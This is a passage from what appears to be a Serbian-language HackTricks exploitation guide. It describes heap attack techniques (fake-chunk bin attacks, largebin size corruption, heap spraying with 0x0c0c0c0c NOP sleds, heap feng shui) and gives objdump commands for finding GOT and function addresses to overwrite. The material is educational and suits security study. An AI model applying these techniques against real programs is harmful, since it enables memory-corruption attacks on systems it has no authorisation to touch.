Da bi se ranjivost izvr≈°ila ≈°to pre, idealno bi bilo: Rezervacija ranjivog dela, rezervacija dela koji ƒáe se modifikovati, oslobaƒëanje ovog dela, rezervacija dela veƒáe veliƒçine koji ƒáe se modifikovati, modifikacija dela (ranjivost), rezervacija dela iste veliƒçine kao ranjivi i rezervacija drugog dela iste veliƒçine i ovaj ƒáe biti onaj koji pokazuje na izabranu adresu.

Da bi se za≈°titio od ovog napada, kori≈°ƒáena je tipiƒçna provera da deo ‚Äúnije‚Äù la≈æan: proverava se da li bck->fd pokazuje na victim. Drugim reƒçima, u na≈°em sluƒçaju, ako pokazivaƒç fd\* la≈ænog dela koji se pokazuje na steku pokazuje na victim. Da bi se pre≈°la ova za≈°tita, napadaƒç bi trebao biti u moguƒánosti da na neki naƒçin (verovatno putem steka) napi≈°e na odgovarajuƒáu adresu adresu victim. Tako da izgleda kao pravi deo.

**Korupcija LargeBin**

Potrebni su isti zahtevi kao ranije i jo≈° neki, pored toga, rezervisani delovi moraju biti veƒái od 512.

Napad je kao i prethodni, tj. mora se modifikovati pokazivaƒç bk i potrebni su svi ti pozivi na malloc(), ali pored toga, treba modifikovati size modifikovanog dela tako da taj size - nb bude < MINSIZE.

Na primer, postaviƒáe da je size 1552 kako bi 1552 - 1544 = 8 < MINSIZE (oduzimanje ne mo≈æe biti negativno jer se uporeƒëuje unsigned)

Pored toga, uvedena je zakrpa da bi se to dodatno ote≈æalo.

**Heap Spraying**

Osnovno se sastoji od rezervisanja ≈°to je moguƒáe vi≈°e memorije za heap i punjenja ovih sa jastuƒçiƒáem nops zavr≈°enim shellcode-om. Pored toga, kao jastuƒçiƒá se koristi 0x0c. Tako da ƒáe se poku≈°ati preskoƒçiti na adresu 0x0c0c0c0c, i tako ako se prepi≈°e neka adresa na koju ƒáe se pozvati sa ovim jastuƒçiƒáem, preskoƒçiƒáe se tamo. Osnovna taktika je rezervisati ≈°to je moguƒáe vi≈°e da vidimo da li se prepisuje neki pokazivaƒç i preskoƒçiti na 0x0c0c0c0c oƒçekujuƒái da tamo budu nops.

**Heap Feng Shui**

Sastoji se od rezervacija i oslobaƒëanja kako bi se semenirala memorija tako da ostanu rezervisani delovi izmeƒëu slobodnih delova. Buffer koji se preplavljuje ƒáe se nalaziti u jednom od jaja.

**objdump -d izvr≈°ni** ‚Äî> Disas funkcije\
**objdump -d ./PROGRAMA | grep FUNKCIJA** ‚Äî> Dobijanje adrese funkcije\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da se vidi da je to zaista na≈° shellcode i izvuƒçe OpCodes\
**objdump -t ./exec | grep varBss** ‚Äî> Tabela simbola, da se izvuƒçe adresa varijabli i funkcija\
**objdump -TR ./exec | grep exit(func lib)** ‚Äî> Da se izvuƒçe adresa funkcija biblioteka (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Izvlaƒçi adresu puts koju treba prepisati u GOT\
**objdump -D ./exec** ‚Äî> Disas SVE do ulaza u plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info o funkciji u gdb

## Zanimljivi kursevi

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Reference**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Uƒçite i ve≈æbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Uƒçite i ve≈æbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr≈°ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove podno≈°enjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
